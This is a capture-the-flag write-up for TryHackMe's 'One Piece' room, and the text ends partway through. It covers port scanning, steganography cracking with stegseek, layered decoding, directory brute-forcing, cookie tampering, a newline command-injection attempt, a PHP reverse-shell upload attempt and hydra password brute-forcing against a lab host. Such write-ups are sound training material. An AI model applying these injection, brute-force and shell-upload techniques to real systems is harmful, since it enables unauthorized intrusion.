# One Piece

## Introduction:

Welcome to my another writeup! In this TryHackMe [One Piece](https://tryhackme.com/room/ctfonepiece65) room, you'll learn: steganography, bruteforce and more! Without further ado, let's dive in.

## Background

> A CTF room based on the wonderful manga One Piece. Can you become the Pirate King?

```
Welcome to the One Piece room.

Your dream is to find the One Piece and hence to become the Pirate King.

Once the VM is deployed, you will be able to enter a World full of Pirates.

Please notice that pirates do not play fair. They can create rabbit holes to trap you.

This room may be a bit different to what you are used to:  
    - Required skills to perform the intended exploits are pretty basic.  
    - However, solving the (let's say) "enigmas" to know what you need to do may be trickier.  
This room is some sort of game, some sort of puzzle.  

  

> Please note that if you are currently reading/watching One Piece and if you did not finish Zou arc, you will get spoiled during this room.
```

- Overall difficulty for me: Medium
    - Initial foothold: Medium
    - Privilege escalation: Easy

## Task 1 - Road Poneglyphs

```
In order to reach Laugh Tale, the island where the One Piece is located, you must collect the 4 Road Poneglyphs.
```

### What is the name of the tree that contains the 1st Road Poneglyph?

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# export RHOSTS=10.10.67.31 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.27.249
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 01:18:18:f9:b7:8a:c3:6c:7f:92:2d:93:90:55:a1:29 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC45MSZ6fV/xyKjd0Vlj750dJSO5TPl1lrNfd+t+qc4LIKnaMoUsyIuxlnTOSQ0yHhGCxRYaDheybyGr1JqQrFazro9bL5cr3o0LQYLgTWbTcVAgkByqDvblrqUj1c6O4R0Z3BoppqzBgXIsUJFw96HAiYzVJCh9RN2rGnAHmqy8lIS/Z56pFlmiEOc3/W1ccnA/ABAIWkX25Kpxz+QE1eMEWEswLG57qmG8nt0qkOT6hQ9sskVW/ADnUmY3rO/dsP7TXh/IvI1slb6HALUlQXXfGUp/2CwOS7SfIthom8HJ3s7STVVOiAQM6xw6USA9QFLObcUSV0qHpXzJnyQtqtl
|   256 cc:02:18:a9:b5:2b:49:e4:5b:77:f9:6e:c2:db:c9:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLQ8y5fOAYcijtTXLprC5JojtRJvMIvbUGGFTMN5eYol3XZucpVKnt/fyLV/5x1jWXsnQixuE2QMCJ6hNRGwHgw=
|   256 b8:52:72:e6:2a:d5:7e:56:3d:16:7b:bc:51:8c:7b:2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWb4BgTYBRRA6bswNkUVwbviPydKMyyWsLyspHwzc/B
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: C31581B251EA41386CB903FC27B37692
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: New World
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 3 ports are opened:

Open Ports        | Service
------------------|------------------------
21                | vsftpd 3.0.3
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache 2.4.29

#### FTP on Port 21

**In FTP, I can login as `anonymous`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# ftp $RHOSTS
Connected to 10.10.67.31.
220 (vsFTPd 3.0.3)
Name (10.10.67.31:nam): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||7858|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .the_whale_tree
-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
226 Directory send OK.
ftp> ^D
221 Goodbye.
```

Let's **download all the files in FTP** via `wget`!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# wget -r ftp://anonymous:''@$RHOSTS

┌──(root🌸siunam)-[~/…/thm/ctf/One-Piece/10.10.67.31]
└─# ls -lah                       
total 16K
drwxr-xr-x 3 root root 4.0K Oct  3 04:56 .
drwxr-xr-x 4 root root 4.0K Oct  3 04:56 ..
drwxr-xr-x 2 root root 4.0K Oct  3 04:56 .the_whale_tree
-rw-r--r-- 1 root root  187 Jul 26  2020 welcome.txt
```

**welcome.txt:**
```
Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World.
Except this, there is not much to say about this island.
```

```
┌──(root🌸siunam)-[~/…/ctf/One-Piece/10.10.67.31/.the_whale_tree]
└─# ls -lah           
total 24K
drwxr-xr-x 2 root root 4.0K Oct  3 04:56 .
drwxr-xr-x 3 root root 4.0K Oct  3 04:56 ..
-rw-r--r-- 1 root root 8.5K Jul 26  2020 .road_poneglyph.jpeg
-rw-r--r-- 1 root root 1.2K Jul 26  2020 .secret_room.txt
```

**.secret_room.txt:**
```
Inuarashi: You reached the center of the Whale, the majestic tree of Zou.
Nekomamushi: We have hidden this place for centuries.
Inuarashi: Indeed, it holds a secret.
Nekomamushi: Do you see this red stele ? This is a Road Poneglyph.
Luffy: A Road Poneglyph ??
Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
Luffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!!
Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.
Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.
Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily.
Luffy: I will show them, there can be only one Pirate King and it will be me !!
Inuarashi: There is another issue regarding the Road Poneglyph.
Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them. 
```

Armed with the `.secret_room.txt` file, the `.road_poneglyph.jpeg` has **something hidden inside**!

**To extract embeded stuff inside the jpeg file, I'll use `steghide` to extract it:**
```
┌──(root🌸siunam)-[~/…/ctf/One-Piece/10.10.67.31/.the_whale_tree]
└─# steghide extract -sf .road_poneglyph.jpeg 
Enter passphrase: 
wrote extracted data to "road_poneglyphe1.txt".
```

**road_poneglyphe1.txt:**
```
FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIK
```

**This looks like a `base32` encoded message! Let's decode that with `base32 -d`:**
```
┌──(root🌸siunam)-[~/…/ctf/One-Piece/10.10.67.31/.the_whale_tree]
└─# cat road_poneglyphe1.txt | base32 -d
----- ----- .---- .---- ----- ----- .---- .----
----- ----- .---- .---- ----- ----- .---- .----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- .---- ----- -----
----- ----- .---- .---- .---- ----- ----- -----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- .---- ----- .----
----- ----- .---- .---- ----- .---- ----- -----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- .---- ----- .----
----- ----- .---- .---- .---- ----- ----- -----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- .---- .---- -----
----- ----- .---- .---- .---- ----- ----- .----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- ----- .---- .----
----- ----- .---- .---- .---- ----- ----- .----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- .---- .---- -----
----- ----- .---- .---- .---- ----- ----- .----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- ----- .---- .----
----- ----- .---- .---- ----- ----- .---- -----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- .---- ----- .----
----- ----- .---- .---- ----- .---- ----- -----
----- ----- .---- ----- ----- ----- ----- -----
----- ----- .---- .---- ----- ----- .---- .----
----- ----- .---- .---- ----- ----- .---- -----
----- ----- .---- ----- ----- ----- ----- -----
```

And this looks like a **morse code**! We can decode that via [CyberChef](https://gchq.github.io/CyberChef):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a1.png)

Now this is a **binary** message. Again, decode it via [CyberChef](https://gchq.github.io/CyberChef):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a2.png)

This looks like a **base10, or decimal**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a3.png)

What is this? It looks like some non-sense, let's take a note of this.

**.secert_room.txt:**
```
[...]
Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
```

Maybe there are mutiple `road_poneglyphe`?

Anyway, the FTP seems enumerated thoroughly, let's move on to the next port.

### What is the name of the 1st pirate you meet navigating the Apache Sea?

#### HTTP on Port 80

**Let's add a domain to `/etc/passwd`: (Optional, but it's a good practice to do this)**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# echo "$RHOSTS one-piece.thm" | tee -a /etc/hosts
```

```html
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# curl http://one-piece.thm/    
<!DOCTYPE html>
<html>
<head lang="en">
    <title>New World</title>
    <link rel="stylesheet" href="./css/style.css">
    <link rel="icon" href="./images/luffy_icon.png" type="image/png"/>
    <meta charset="utf-8"/>

</head>

<body>
    <img src="./images/boat.png" alt="Boat" title="Boat"/>
    <p>
        Straw Hat Luffy and his crew are sailing in the New World. <br/>
        They have only one thing in mind, reach the One Piece and hence become the Pirate King, that is to say the freest man in the world.<br/>
        <br/>
        Unfortunately, your navigator Nami lost the Log Pose and as you know, it is not possible to properly steer without it.<br/>
        You need to find the Log Pose to be able to reach the next island.
        <!--J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5-->
    </p>
</body>
</html>
```

```
Straw Hat Luffy and his crew are sailing in the New World.  
They have only one thing in mind, reach the One Piece and hence become the Pirate King, that is to say the freest man in the world.  
  
Unfortunately, your navigator Nami lost the Log Pose and as you know, it is not possible to properly steer without it.  
You need to find the Log Pose to be able to reach the next island.
```

**In the home page, we can see that there is a big blob of HTML commented `base32` string!**

**Let's decode that again!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# echo "J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5" | base32 -d
OjE4IVIrRCNHM0ZgTSY3K0VWOi5FYi1BJUViLUE0RWIvYHBGKEswNSs+WWk1MSpDT1NGKXUmKUNoNGAuQ2dnZ2JGISxbP0FURD8pRihmLC1AckhMK0EwPlBvRyVEZTREZl4iQ0Jsa3M= 

┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# echo "J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5" | base32 -d | base64 -d
:18!R+D#G3F`M&7+EV:.Eb-A%Eb-A4Eb/`pF(K05+>Yi51*COSF)u&)Ch4`.CgggbF!,[?ATD?)F(f,-@rHL+A0>PoG%De4Df^"CBlks
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a4.png)

```
Nami ensures there are precisely 3472 possible places where she could have lost it.
```

Now, let's take a step back to the home page:

```
You need to find the Log Pose to be able to reach the next island.
```

**Find the Log Pose? Maybe it's OSINT, or Open-Source Intelligence?**

Then, **I googled `Log Pose github`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a7.png)

This **GitHub repository** looks we're in scope!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a8.png)

Let's take a look at that **`txt` file**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a9.png)

**Is this a wordlist?**

We can `wget` that file and **enumerate hidden directory** on the web server!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# wget https://raw.githubusercontent.com/1FreyR/LogPose/master/LogPose.txt

┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# gobuster dir -u http://one-piece.thm/ -w LogPose.txt -t 100
[...]
===============================================================
2022/10/03 06:07:54 Starting gobuster in directory enumeration mode
===============================================================
                              
===============================================================
2022/10/03 06:08:07 Finished
===============================================================
```

**Hmm... Nothing?? Maybe hidden file?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# gobuster dir -u http://one-piece.thm/ -w LogPose.txt -t 100 -x php,html,txt,bak
[...]
/dr3ssr0s4.html       (Status: 200) [Size: 3985]
```

Found it!!

**`/dr3ssr0s4.html`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a10.png)

**You might wonder what is that black thing, it's the `rabbit_hole.png` picture!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# curl http://one-piece.thm/dr3ssr0s4.html
[...]
<img id="background" src="./images/rabbit_hole.png"/>
```

The `rabbit_hole.png` looks interesting. Let's `wget` that picture!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# wget http://one-piece.thm/images/rabbit_hole.png
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a6.png)

**rabbit_hole.png:**
```
6b 65 79 3a 69 6d 20 6f 6e 20 6f 74 69 20 6f 74 69

m5.J`/{{#F%&!5Gl}+n<a

Lhtttavbsw ql gbbzy gfivwwvz
```

**In the first string, we can decode it via `xxd -r -p`:**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# echo "6b 65 79 3a 69 6d 20 6f 6e 20 6f 74 69 20 6f 74 69" | xxd -r -p
key:im on oti oti
```

**Second string:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a11.png)

```
ito ito no mi:yek
```

**Third string:**

Hmm... The decoded first string has a `key:`, which reminds me it's being encrypted by **vigenere encryption**??

- Key: `imonotioti`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a12.png)

```
Dvfgfhnnzo iz songq smankiil
```

- Key: `itoitonomi`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a13.png)

```
Doflamingo is still standing
```

Looks like the `itoitonomi` key is correct! **But after we decoded and decrypted all of them, still wouldn't solve the answer!**

Let's take a step back again.

**In the source page of `/dr3ssr0s4.html`, it has a CSS stylesheet:**
```html
<!DOCTYPE html>
<html>
<head lang="en">
    <title>Dressrosa</title>
    <link rel="stylesheet" href="./css/dressrosa_style.css">
    <link rel="icon" href="./images/luffy_icon.png" type="image/png"/>
    <meta charset="utf-8"/>

</head>
[...]
```

**And the `king_kong_gun.jpg` seems interesting:**
```css
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# curl http://one-piece.thm/css/dressrosa_style.css
[...]
#container {
    height: 75vh;
    width: 90vw;
    margin: 1vh;
    background-image: url("../king_kong_gun.jpg");
    background-repeat: no-repeat;
    background-position: center;
    background-size: cover;
    display: flex;
    flex-direction: row;
    justify-content: center;
    align-items: flex-start;
    align-content: flex-start;
    flex-wrap: wrap;
    position: relative;
}
[...]
```

**Let's `wget` that picture!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# wget http://one-piece.thm/king_kong_gun.jpg
```

**`exiftool` shows that the image has a comment metadata!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# exiftool king_kong_gun.jpg                                           
[...]
Comment                         : Doflamingo is /ko.jpg
[...]
```

**Hmm... Let's `wget` that image too!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# wget http://one-piece.thm/ko.jpg
```

I tried `steghide extract -sf` to extract hidden file inside it, but no dice. Then `strings` outputs something weird...

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# strings ko.jpg
[...]
[|xb
'8,6
<$cq,9r
Ts;}
Congratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php
```

Found `/wh0l3_c4k3.php`!

### What is the name of the friend you meet navigating the Apache Sea?

**`/wh0l3_c4k3.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a14.png)

That input box I suspected that it's **vulnerable to some injections, like command injection**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a15.png)

I tried some low hanging fruit command injection payload, but no dice.

It seems like the input is being filtered. 

Then, I tried some bypasses, but still, no luck:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# curl -s http://one-piece.thm/wh0l3_c4k3.php -X POST -d "text_input=%0Aid" | grep 'I did'
I did not expect that.</body>
```

> Note: `%0A` is the newline character but URL encoded.

Hmm... **Maybe it just outputs `I did not expect that.` when I submit it??**

Bruh... Let's go back.

**In the source page of `/wh0l3_c4k3.php`, I found there is a HTML comment:**
```html
    <p>
        You are on Whole Cake Island. This is the territory of Big Mom, one of the 4 Emperors, this is to say one of the 4 pirates the closest to the One Piece but also the strongest.</br>
        Big Mom chases you and want to destroy you. It is unthinkable to fight her directly.<br/>
        You need to find a way to appease her.
        <!--Big Mom likes cakes-->
    </p>
```

```
Big Mom likes cakes
```

**Also, there is a cookie that has been set:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a16.png)

This cookie is called `cookie`, and it's value is `NoCakeForYou`.

**Armed with above information, maybe we can change the cookie value to `Big Mom likes cakes`??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a17.png)

**Let's refresh the page (`Ctrl + R`):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a18.png)

Ohh!! Nice! Let's decode that `base32` string!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a19.png)

**Now, let's go to `/r4nd0m.html`:**

### What is the name of the 2nd Emperor you meet navigating the Apache Sea?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a20.png)

The `Brick Breaker` page brings me to a web game:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a21.png)

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8"/>
        <title>Casse Brick</title>
        <link rel="stylesheet" href="./brick_breaker.css"/>
    </head>

    <body>
        <canvas id="myCanvas"></canvas>
        <script src="./brick_breaker.js"></script>
    </body>
</html>
```

Let's take a look at the **javascript**!

**brick_breaker.js:**
```js
[...]
function collisionDetection() {
    for (var c = 0; c < brickColumnCount; c++) {
        for (var r = 0; r < brickRowCount; r++) {
            var b = bricks[c][r];
            if (b.status == 1) {
                if (x > b.x && x < b.x+brickWidth && y > b.y && y < b.y+brickHeight) {
                    dy = -dy;
                    b.status = 0;
                    score++;
                    if (score == brickRowCount*brickColumnCount) {
                        alert("Wait whaaaat ?? Did you cheat somehow !? Let's do another one with my other game !");
                        document.location.reload();
                        clearInterval(interval); // Needed for Chrome to end game
                    }
                }
            }
        }
    }
}
[...]
```

Hmm... Let's go the another game, `Brain Teaser`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a22.png)

Again, **view the source page:**

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8"/>
        <title>Cube JS</title>
        <link rel="stylesheet" href="./brain_teaser.css"/>
    </head>

    <body>
        <div id="container">
            <div id="container__animation">
                <div id="front" class="cube_face"></div>
                <div id="back" class="cube_face"></div>
                <div id="right" class="cube_face"></div>
                <div id="left" class="cube_face"></div>
                <div id="top" class="cube_face"></div>
                <div id="bottom" class="cube_face"></div>
            </div>
        </div>
        <script src="./brain_teaser.js"></script>
    </body>
</html>
```

**brain_teaser.js:**
```js
document.getElementById('back').textContent = "Log Pose: /0n1g4sh1m4.php"
```

Ohh!! Let's go to `/0n1g4sh1m4.php`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a23.png)

### What is the hidden message of the 4 Road Poneglyphs?

**Since the `/0n1g4sh1m4.php` allows users to upload a file, I'll try to upload a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# cp /usr/share/webshells/php/php-reverse-shell.php /home/nam/Downloads 
                                                                          
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# nano /home/nam/Downloads/php-reverse-shell.php
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a24.png)

The file is successfully uploaded and without any filter, **but where does the uploaded file lives??**

**Then, I tried to enumerate hidden directory via `gobuster` to find the uploaded directory:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# gobuster dir -u http://one-piece.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php
[...]
```

But no dice... **It seems like the upload file button is doing nothing.**

How about **bruteforcing the login page??**

**`/0n1g4sh1m4.php`:**
```
Speaking about brute force, Kaido is unbeatable.
```

**In this page, we see a username called `kaido`.**

When I entered a wrong credentials, it shows `ERROR` message:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a25.png)

**Now, I can try to bruteforce the login page via `hydra`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# hydra -l kaido -P /usr/share/wordlists/rockyou.txt $RHOSTS http-post-form '/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR'
[...]
```

But still, unable to bruteforce it...

**Then, I looked back to the source page:**
```
    <div id="island_pics">
        <img src="./images/onigashima.png" alt="Onigashima" title="Onigashima"/>
        <img src="./images/kaido.jpeg" alt="Kaido" title="Kaido"/>
    </div>
```

**The `kaido.jpeg` is in a jpeg format, not png!** That's weird, let's `wget` that:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# wget http://one-piece.thm/images/kaido.jpeg
```

**Next, I tried `strings`, `exiftool` and `steghide`, but nothing...**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# strings kaido.jpeg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# exiftool kaido.jpeg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# steghide extract -sf kaido.jpeg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Or maybe I need the **passphrase to extract hidden file??**

**We can crack that via [`stegseek`](https://github.com/RickdeJager/stegseek), which will crack that passphrase extremely fast:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# stegseek kaido.jpeg /usr/share/wordlists/rockyou.txt
[...]
[i] Found passphrase: "{Redacted}"       
[i] Original filename: "kaido_login.txt".
[i] Extracting to "kaido.jpeg.out".
```

Cracked in 0.09 second!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# cat kaido.jpeg.out 
Username:{Redacted}
```

**Now, armed with above information, we can bruteforce the password via `hydra`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
